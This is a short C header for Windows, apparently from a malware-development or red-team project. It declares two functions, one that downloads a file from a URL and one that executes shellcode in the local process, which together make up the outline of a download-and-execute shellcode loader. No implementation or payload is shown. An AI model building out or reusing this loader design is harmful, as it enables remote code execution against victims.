#pragma once
#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <Windows.h>

BOOL FetchFileFromURLW(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);
BOOL ExecuteShellcodeInLocalProcess(IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread);

#endif
